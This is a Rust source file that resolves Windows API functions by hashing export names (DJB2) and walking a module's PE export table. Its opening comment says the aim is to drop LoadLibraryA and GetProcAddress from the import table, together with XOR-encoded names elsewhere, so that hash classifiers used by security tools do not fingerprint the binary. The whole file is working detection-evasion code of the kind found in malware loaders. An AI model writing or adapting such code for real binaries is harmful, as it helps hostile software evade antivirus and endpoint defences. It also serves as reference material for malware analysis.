// api_hash.rs — Compile-time DJB2 hashes for the Win32 exports we bootstrap
// via PEB walk. Only LoadLibraryA + GetProcAddress are resolved this way;
// everything else is resolved via LoadLibraryA + GetProcAddress with
// XOR-encoded names (see resolver.rs). This keeps the .rdata footprint small
// while still eliminating the LL/GPA IAT slots that every PE hash classifier
// fingerprint-checks.

/// DJB2 hash over uppercased ASCII bytes, computed at compile time.
pub const fn djb2(s: &[u8]) -> u32 {
    let mut h: u32 = 5381;
    let mut i = 0;
    while i < s.len() {
        let c = if s[i] >= b'a' && s[i] <= b'z' { s[i] - 32 } else { s[i] };
        h = h.wrapping_mul(33).wrapping_add(c as u32);
        i += 1;
    }
    h
}

/// Runtime DJB2 hash over a null-terminated byte string.
#[inline(always)]
pub unsafe fn djb2_ptr(mut p: *const u8) -> u32 {
    let mut h: u32 = 5381;
    loop {
        let c = *p;
        if c == 0 { break; }
        let cu = if c >= b'a' && c <= b'z' { c - 32 } else { c };
        h = h.wrapping_mul(33).wrapping_add(cu as u32);
        p = p.add(1);
    }
    h
}

pub const HASH_LOAD_LIBRARY_A:   u32 = djb2(b"LoadLibraryA");
pub const HASH_GET_PROC_ADDRESS: u32 = djb2(b"GetProcAddress");

pub type FnLoadLibraryA   = unsafe extern "system" fn(*const u8) -> *mut u8;
pub type FnGetProcAddress = unsafe extern "system" fn(*mut u8, *const u8) -> *mut u8;

/// Walk a module's export table and return the address of the function
/// whose uppercased name hashes to `hash`, or null if not found.
#[inline(always)]
pub unsafe fn get_proc_by_hash(base: *const u8, hash: u32) -> *mut u8 {
    // PE header chain.
    let e_lfanew = (base.add(0x3C) as *const i32).read_unaligned() as usize;
    let nt       = base.add(e_lfanew);

    // OptionalHeader at nt+4(sig)+20(FileHdr) = nt+24; DataDirectory[0] at +112.
    let exp_rva = (nt.add(24 + 112) as *const u32).read_unaligned();
    if exp_rva == 0 { return core::ptr::null_mut(); }

    let exp       = base.add(exp_rva as usize);
    let num_names = (exp.add(24) as *const u32).read_unaligned() as usize;
    let names_rva = (exp.add(32) as *const u32).read_unaligned();
    let ords_rva  = (exp.add(36) as *const u32).read_unaligned();
    let funcs_rva = (exp.add(28) as *const u32).read_unaligned();

    let names = base.add(names_rva as usize) as *const u32;
    let ords  = base.add(ords_rva  as usize) as *const u16;
    let funcs = base.add(funcs_rva as usize) as *const u32;

    let mut i = 0;
    while i < num_names {
        let name_ptr = base.add((*names.add(i)) as usize);
        if djb2_ptr(name_ptr) == hash {
            let ord      = (*ords.add(i)) as usize;
            let func_rva = (*funcs.add(ord)) as usize;
            return base.add(func_rva) as *mut u8;
        }
        i += 1;
    }
    core::ptr::null_mut()
}
